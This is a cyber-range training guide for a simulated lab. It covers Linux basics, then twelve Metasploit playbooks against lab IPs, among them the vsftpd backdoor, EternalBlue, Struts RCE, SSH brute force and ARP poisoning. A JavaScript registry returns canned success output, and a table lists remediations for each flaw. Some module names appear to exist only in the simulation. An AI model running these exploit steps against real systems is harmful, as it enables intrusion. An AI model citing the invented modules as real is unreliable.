# CyberRange
# Build for Learning Purpose in ethical frmework

It is simulated environment for Cyber Range 
=================================================================================================================
Student-focused training tutorial designed to teach basic Linux operations and penetration testing fundamentals. This lab guide breaks down how to navigate the system and how to run your first automated network audits.
## Part 1: Core Linux Command Training
Before launching any security tools, you must learn how to navigate files and inspect your system configurations.
### 1. Identifying Your Workspace (pwd, whoami, ifconfig)
 * **whoami**: Tells you your current user account account privilege level. In security environments, you want to see root (the master administrator).
 * **pwd**: Prints your Current Working Directory. It helps keep you from getting lost in deep folder systems.
 * **ifconfig / ip a**: Displays your network adapters. Use this to locate your local IP address (10.0.5.5) so you know what subnet you are auditing.
### 2. Handling Files and Directories (ls, mkdir, touch, cat)
 * **ls**: Lists everything inside your active folder. Directories will look blue, while plain text data looks white.
 * **mkdir logs**: Creates a brand new folder named logs.
 * **touch notes.txt**: Spawns an empty text file named notes.txt.
 * **cat COMMANDS.md**: Reads out the contents of a text file directly on your terminal display screen.
### 3. Text Streams and Filters (grep, head, tail)
 * **grep "10.0.5.15" COMMANDS.md**: Searches through a file and strips out only the specific lines containing your keyword or target IP address.
 * **head -n 2 network_topology.conf**: Grabs only the first two header rows of a file to check formatting layouts quickly.
## Part 2: Interactive Text Editing with Vim
vim is a terminal-based text editor. It doesn't use a standard mouse interface, so you must control it entirely with commands.
### How to use the Vim Simulation:
 1. **Open a File**: Type vim script.sh to change your active view screen into the editor overlay layout.
 2. **Edit text**: Click into the box and type out your text configuration notes normally.
 3. **Save and Quit (:wq)**: Go to the very end of your document, type **:wq**, and hit Enter. The editor will save your work and return you to the main command prompt safely.
 4. **Discard and Quit (:q!)**: If you make a mistake and want to exit without saving, type **:q!** and press Enter.
## Part 3: Threat Emulation Playbooks
This section covers basic information gathering and vulnerability matching using the Metasploit Framework simulation.
```
       [ Kali Linux Machine ] (10.0.5.5)
                 │
        ┌────────┴────────┐
        ▼                 ▼
[Linux Target]     [Windows Target]
 (10.0.5.15)        (10.0.5.20)

```
### Lab Phase 1: Network Reconnaissance
Before launching an attack, you must scout the target's open network ports. Run a service discovery scan:
```bash
nmap -sV 10.0.5.15

```
*Look at the output: Port 21 is open running vsftpd 2.3.4. This version contains a famous historic backdoor vulnerability.*
### Lab Phase 2: Loading an Exploit Module
 1. Launch your exploit database terminal wrapper:
   ```bash
   msfconsole
   
   ```
 2. Mount the matching exploit profile module from the manual blueprint:
   ```bash
   use exploit/unix/ftp/vsftpd_234_backdoor
   
   ```
 3. Direct your attack module toward the target's IP address:
   ```bash
   set RHOSTS 10.0.5.15
   
   ```
 4. Fire the payload module sequence:
   ```bash
   exploit
   
   ```
### Lab Phase 3: Inspecting System Topology Updates
Once the exploit runs successfully, look at the dashboard boxes above your console. The status indicator will transition from **Active / Secure** to **COMPROMISED / ROOT ACCESS**. This visual indicator confirms you have successfully established a remote control session over the network node.
To clear down your workspace and start another lab challenge, simply type **exit** or **quit**.
=================================================================================================================
Based on the source code configuration of simulation studio, here are the detailed infrastructure specifications for both targeted vulnerable virtual machines:
### 1. Linux Target Server (Metasploitable)
This machine simulates a misconfigured Linux server hosting multiple exposed legacy daemons. It is heavily utilized across Playbooks A, C, and D.
 * **IP Address Address Pointer:** 10.0.5.15
 * **Operating System Layout:** Ubuntu Core Linux
 * **Active Exposed Open Ports:** * 21/tcp (FTP) — Running vsftpd 2.3.4
   * 22/tcp (SSH) — Running OpenSSH 8.2p1
   * 8080/tcp (HTTP) — Running Apache Tomcat
 * **Weaponized Threat Vectors:**
   * **vsftpd Backdoor:** A historic vulnerability where inputting specific characters triggers a shell listener on port 6200.
   * **Apache Struts OGNL RCE:** An input-validation issue inside HTTP request headers allowing remote command injections.
   * **SSH Credential Flaw:** Vulnerable to brute-force automated wordlist dictionary spray attacks (admin / p@ssword123).
### 2. Windows Active Directory Node
This machine acts as a corporate internal infrastructure workstation node containing architectural flaws within its network file sharing protocol stack. It is utilized in Playbook B.
 * **IP Address Address Pointer:** 10.0.5.20
 * **Operating System Layout:** Windows Server 2016
 * **Active Exposed Open Ports:**
   * 445/tcp (SMB / Microsoft-DS) — Windows Core File Sharing Interface
 * **Weaponized Threat Vectors:**
   * **MS17-010 (EternalBlue):** A critical remote code execution vulnerability residing in the Microsoft Server Message Block (SMBv1) protocol handler loop. It allows an unauthenticated attacker to send crafted packets and execute arbitrary code with NT AUTHORITY\SYSTEM permissions.
### Target Verification Summary Reference Table
You can verify these live network landscapes directly inside your simulation prompt by using the integrated footprinting tools:

| Verification Target IP | Native Command to Run | Expected Service Result from Code |
| :--- | :--- | :--- |
| **10.0.5.15** | nmap -sV 10.0.5.15 | Reports open states for ports **21**, **22**, and **8080** alongside service versions. |
| **10.0.5.20** | nmap -sV 10.0.5.20 | Reports port **445** open and flags structural vulnerability signature **MS17-010**. |
==================================================================================================================
**Comprehensive master tutorial** designed for students and lab instructors. This manual integrates **all playbooks (A through L)** into a unified, step-by-step training curriculum spanning traditional IT networks, Active Directory, cloud containers, Operational Technology (OT), and air-gapped defense architectures.
## ── SECTION 1: LAB TOPOLOGY & PRE-FLIGHT CHECKS ──
Before executing any playbook, students must verify their local networking profile. The laboratory architecture routes all traffic through your local Kali Linux interface.
```
                                    [ KALI ATTACK MACHINE ]
                                     Local IP: 10.0.5.5
                                             │
      ┌──────────────────────────────────────┼──────────────────────────────────────┐
      ▼                                      ▼                                      ▼
[LINUX APPS]                           [WINDOWS AD]                           [PERIMETER / CLOUD]
• 10.0.5.15 (FTP/Web)                  • 10.0.5.20 (SMB/DC)                   • 10.0.5.1 (Palo Alto NGFW)
• 10.0.5.40 (Prod Web)                                                        • 10.0.5.30 (Docker Node)
      │                                                                             │
      ▼                                                                             ▼
[INDUSTRIAL SCADA]                                                            [ISOLATED ZONE]
• 10.0.5.50 (S7 Firewall/PLC)                                                 • 10.0.5.60 (Staging Depot)
```
### Pre-Flight Verification Commands
Run these commands in the native bash terminal layer to ensure connectivity and verify identity:
```bash
whoami     # Expected Output: root
pwd        # Expected Output: /root
ip a       # Confirm interface eth0 points to the 10.0.5.0/24 subnet
```
## ── SECTION 2: STEP-BY-STEP EXECUTIONS (A - L) ──
### Playbook A: Linux FTP Backdoor Auditing
 * **Target IP:** 10.0.5.15 (Port 21)
 * **Concept:** Testing for historic unauthenticated code injection vulnerabilities in legacy software configurations.
 * **Execution Flow:**
   ```bash
   nmap -sV 10.0.5.15
   msfconsole
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 10.0.5.15
   exploit
   
   ```
 * **Post-Exploitation Action:** Type whoami inside the opened shell. The status badge on your dashboard changes to **COMPROMISED**. Type exit to close the shell.
### Playbook B: Windows SMB EternalBlue Validation
 * **Target IP:** 10.0.5.20 (Port 445)
 * **Concept:** Auditing kernel-level transaction buffer pool vulnerabilities within legacy network file-sharing protocol stacks.
 * **Execution Flow:**
   ```bash
   msfconsole
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOSTS 10.0.5.20
   exploit
   
   ```
 * **Post-Exploitation Action:** Once the Meterpreter session opens, run sysinfo to verify the host operating system architecture. Type exit to return to the console.
### Playbook C: Web Application RCE (Apache Struts)
 * **Target IP:** 10.0.5.15 (Port 8080)
 * **Concept:** Analysing input-validation mechanics inside incoming HTTP header structures.
 * **Execution Flow:**
   ```bash
   msfconsole
   use exploit/multi/http/struts2_content_type_ognl
   set RHOSTS 10.0.5.15
   exploit
   
   ```
### Playbook D: SSH Automated Dictionary Authentication Scan
 * **Target IP:** 10.0.5.15 (Port 22)
 * **Concept:** Validating service configurations against administrative password credential spraying.
 * **Execution Flow:**
   ```bash
   msfconsole
   use auxiliary/scanner/ssh/ssh_login
   set RHOSTS 10.0.5.15
   run
   
   ```
### Playbook E: Next-Generation Firewall Policy Auditing
 * **Target IP:** 10.0.5.1 (Port 443)
 * **Concept:** Verifying perimeter security configurations and API access management boundaries.
 * **Execution Flow:**
   ```bash
   nmap -sV 10.0.5.1
   msfconsole
   use exploit/paloalto/panos/mgmt_rce_bypass
   set RHOSTS 10.0.5.1
   exploit
   
   ```
### Playbook F: Active Directory Domain Takeover Validation
 * **Target IP:** 10.0.5.20 (Port 445)
 * **Concept:** Assessing cryptographic authentication token relationships (e.g., Active Directory Certificate Services or Kerberos Delegation properties).
 * **Execution Flow:**
   ```bash
   msfconsole
   use exploit/windows/smb/ad_domain_takeover
   set RHOSTS 10.0.5.20
   exploit
   
   ```
 * **Dashboard Impact:** The dashboard updates target status to **DOMAIN CONTROLLED**.
### Playbook G: Container Breakout (Privileged Mode Escape)
 * **Target IP:** 10.0.5.30 (Port 80/9000)
 * **Concept:** Evaluating Linux namespace isolation parameters and kernel capabilities (CAP_SYS_ADMIN).
 * **Execution Flow:**
   ```bash
   nmap -sV 10.0.5.30
   msfconsole
   use exploit/linux/local/container_breakout
   set RHOSTS 10.0.5.30
   exploit
   
   ```
### Playbook H: Mobile Application Data Leakage Auditing
 * **Target IP:** 127.0.0.1 (Local Emulation Loopback via ADB)
 * **Concept:** Analyzing unencrypted static file permissions within modern application sandbox environments.
 * **Execution Flow:**
   ```bash
   adb devices
   msfconsole
   use exploit/android/local/storage_audit
   set RHOSTS 127.0.0.1
   exploit
   
   ```
### Playbook I: Web Server Insecure Deserialization
 * **Target IP:** 10.0.5.40 (Port 80)
 * **Concept:** Investigating how object state parameters handle user-controlled values inside session strings.
 * **Execution Flow:**
   ```bash
   curl -I http://10.0.5.40/dashboard
   msfconsole
   use exploit/multi/http/web_deserialization
   set RHOSTS 10.0.5.40
   exploit
   
   ```
### Playbook J: Machine-in-the-Middle (MitM) ARP Cache Poisoning
 * **Target Subnet Gateway:** 10.0.5.1 | **Target Host Node:** 10.0.5.15
 * **Concept:** Demonstrating local layer-2 transport configuration weaknesses when lacking Dynamic ARP Inspection (DAI).
 * **Execution Flow:**
   ```bash
   msfconsole
   use auxiliary/spoof/arp/arp_poisoning
   set RHOSTS 10.0.5.15
   run
   
   ```
### Playbook K: Industrial S7 Comm Firewall Rule Verification
 * **Target IP:** 10.0.5.50 (Port 102)
 * **Concept:** Validating Operational Technology (OT) network isolation and deep packet inspection (DPI) boundaries.
 * **Execution Flow:**
   ```bash
   nmap -p 102 10.0.5.50
   msfconsole
   use auxiliary/scanner/scada/s7comm_enumerate
   set RHOSTS 10.0.5.50
   run
   
   ```
### Playbook L: Air-Gapped Transient Supply Chain Audit
 * **Target IP:** 10.0.5.60 (Staging Depot)
 * **Concept:** Auditing security compliance and system integrity controls on removable filesystems entering physically isolated environments.
 * **Execution Flow:**
   ```bash
   msfconsole
   use auxiliary/scanner/misc/airgap_transient_audit
   set RHOSTS 10.0.5.60
   run
   
   ```
## ── SECTION 3: THE COMPREHENSIVE BACKEND CODE INDEX ──
To ensure your web app simulation environment processes all these options smoothly with zero compilation or parsing exceptions, replace or update the PLAYBOOKS_REGISTRY mapping object inside your central index.html file using this structure:
```javascript
/**
 * Master Laboratory Simulation Configuration Matrix
 * Integrates Playbooks A through L into the command handling engine.
 */
const PLAYBOOKS_REGISTRY = {
  "exploit/unix/ftp/vsftpd_234_backdoor": {
    "target_ip": "10.0.5.15",
    "success_payload_response": "[*] Targeting 10.0.5.15:21...\n[+] Banner matching found: vsftpd v2.3.4\n[*] Triggering backdoor token hook sequence...\n<span class=\"exploit-success\">[+] Command shell session 1 opened successfully. Privilege level: root</span>"
  },
  "exploit/windows/smb/ms17_010_eternalblue": {
    "target_ip": "10.0.5.20",
    "success_payload_response": "[*] Targeting 10.0.5.20:445...\n[*] Initiating connection parameters...\n[+] Core vulnerability signature MS17-010 confirmed.\n[*] Injecting kernel ring payload data...\n<span class=\"exploit-success\">[+] Meterpreter session 2 opened successfully. Privilege level: NT AUTHORITY\\SYSTEM</span>"
  },
  "exploit/multi/http/struts2_content_type_ognl": {
    "target_ip": "10.0.5.15",
    "success_payload_response": "[*] Packaging custom HTTP payload...\n[+] Exploit string verified against Apache endpoint.\n<span class=\"exploit-success\">[+] Command shell session 3 established successfully.</span>"
  },
  "auxiliary/scanner/ssh/ssh_login": {
    "target_ip": "10.0.5.15",
    "success_payload_response": "[*] Bootstrapping credentials matrix check...\n[+] Matching verification found: user: admin | pass: p@ssword123\n<span class=\"exploit-success\">[+] Session 4 registered securely via default access vector.</span>"
  },
  "exploit/paloalto/panos/mgmt_rce_bypass": {
    "target_ip": "10.0.5.1",
    "success_payload_response": "[*] Targeting 10.0.5.1:443...\n[*] SSL/TLS signature verified: PAN-OS Gateway Node\n[+] Bypassing authentication barriers via administrative API parameters...\n<span class=\"exploit-success\">[+] Meterpreter session 5 opened successfully! Boundary network compromised.</span>"
  },
  "exploit/windows/smb/ad_domain_takeover": {
    "target_ip": "10.0.5.20",
    "success_payload_response": "[*] Intercepting local Active Directory identity flows...\n[+] Forging Kerberos Ticket (Golden Ticket generation template)...\n[*] Harvesting core NTDS.dit system credential assets...\n<span class=\"exploit-success\">[+] Active Directory compromised. Full DOMAIN CONTROL established over lab.local!</span>"
  },
  "exploit/linux/local/container_breakout": {
    "target_ip": "10.0.5.30",
    "success_payload_response": "[*] Auditing sandboxed filesystem runtime...\n[+] Capability vector found: CAP_SYS_ADMIN privileges active\n[*] Mounting host raw physical architecture hardware block /dev/sda1...\n<span class=\"exploit-success\">[+] Container breakout verified. Complete execution control established over host node!</span>"
  },
  "exploit/android/local/storage_audit": {
    "target_ip": "127.0.0.1",
    "success_payload_response": "[*] Establishing links over loopback emulated interface...\n[*] Traversing private sandboxed application partitions...\n[+] Unencrypted cleartext credentials found within profile XML records.\n<span class=\"exploit-success\">[+] Mobile storage architecture verification audit complete.</span>"
  },
  "exploit/multi/http/web_deserialization": {
    "target_ip": "10.0.5.40",
    "success_payload_response": "[*] Sampling web app state metadata streams...\n[+] Target identified: 10.0.5.40 Node.js Framework\n[*] Replacing tracking cookie with modified serialized session structure...\n<span class=\"exploit-success\">[+] Payload validated. Interface execution context escalated to Web Administrator.</span>"
  },
  "auxiliary/spoof/arp/arp_poisoning": {
    "target_ip": "10.0.5.15",
    "success_payload_response": "[*] Intercepting local layer-2 configuration paths...\n[+] Forged ARP replies transmitted to 10.0.5.1 and 10.0.5.15 smoothly.\n<span class=\"exploit-success\">[+] Machine-in-the-Middle active. Capturing cleartext network transport streams.</span>"
  },
  "auxiliary/scanner/scada/s7comm_enumerate": {
    "target_ip": "10.0.5.50",
    "success_payload_response": "[*] Initializing ISO-on-TCP handshake on port 102...\n[+] S7 Comm setup handshake acknowledged. Open channel confirmed.\n[*] Extracting PLC hardware system metadata identification records...\n<span class=\"exploit-success\">[+] OT Gateway audit complete. Exposed PLC Hardware Fingerprint mapped (S7-1200).</span>"
  },
  "auxiliary/scanner/misc/airgap_transient_audit": {
    "target_ip": "10.0.5.60",
    "success_payload_response": "[*] Analyzing unverified staging host data ingestion pipelines at 10.0.5.60...\n[+] Mapping mount rules across transient media profiles...\n[-] Insecure supply chain route verified: File metadata signatures missing.\n<span class=\"exploit-success\">[+] Isolation network perimeter audit complete. Data pathway vulnerability mapped.</span>"
  }
};
```
## ── SECTION 4: STUDENT LABORATORY VERIFICATION REPORT ──
To complete the lab, students must fill out the following matrix to demonstrate they have completed the auditing tasks and understood the underlying structural defensive mitigations.

| Playbook | Target IP Address | Protocol Audited | Key Security Finding / Root Flaw | Recommended Remediation Action |
| :--- | :--- | :--- | :--- | :--- |
| **A** | 10.0.5.15 | FTP (21) | Malicious code inside system package backdoor. | Upgrade legacy services to modern software distributions. |
| **B** | 10.0.5.20 | SMB (445) | Kernel pool execution vulnerability (MS17-010). | Deploy latest platform updates; completely disable SMBv1. |
| **E** | 10.0.5.1 | HTTPS (443) | Unauthenticated gateway management interface access. | Lock management ports to restricted local administrative subnets. |
| **F** | 10.0.5.20 | Active Directory | Misconfigured ADCS templates / Ticket forging. | Implement Tiered Administration and remove weak enrollment profiles. |
| **G** | 10.0.5.30 | Container / API | Container running in privileged execution mode. | Remove --privileged flags; adhere to the principle of least privilege. |
| **J** | 10.0.5.15 | ARP Routing | Layer-2 unauthenticated network topology mapping. | Enforce Dynamic ARP Inspection (DAI) on infrastructure switches. |
| **K** | 10.0.5.50 | S7 Comm (102) | Permissive network rule configuration over PLC. | Implement deep packet inspection (DPI) and segment SCADA traffic. |
| **L** | 10.0.5.60 | Removable Media | Unsigned, unvalidated file replication paths. | Enforce cryptographic file hashes on staging media. |
